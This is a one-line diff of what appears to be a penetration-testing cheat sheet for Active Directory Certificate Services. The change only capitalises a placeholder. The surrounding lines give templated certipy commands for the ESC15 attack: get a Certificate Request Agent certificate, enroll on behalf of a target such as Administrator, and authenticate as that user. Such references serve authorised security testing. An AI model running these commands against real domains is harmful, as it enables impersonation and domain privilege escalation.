@@ -42,6 +42,6 @@ certipy cert -pfx <pfx> -nokey -out <out_crt>
 ## ESC15 (scenario B)
 ```
 certipy req -u '<user>'@<domain> <auth> -dc-ip <dc_ip> -target <ca_fqdn> -ca <ca> -template <vuln_template> -upn '<target_user>@<domain>' -application-policies 'Certificate Request Agent'
-certipy req -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -ca <ca> -template '<user_template|User>' -pfx <target_user|administrator>.pfx -on-behalf-of '<netbios>\<target_user>'
+certipy req -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -ca <ca> -template '<user_template|User>' -pfx <target_user|Administrator>.pfx -on-behalf-of '<netbios>\<target_user>'
 certipy auth -pfx '<target_user>.pfx' -dc-ip <dc_ip>
 ```
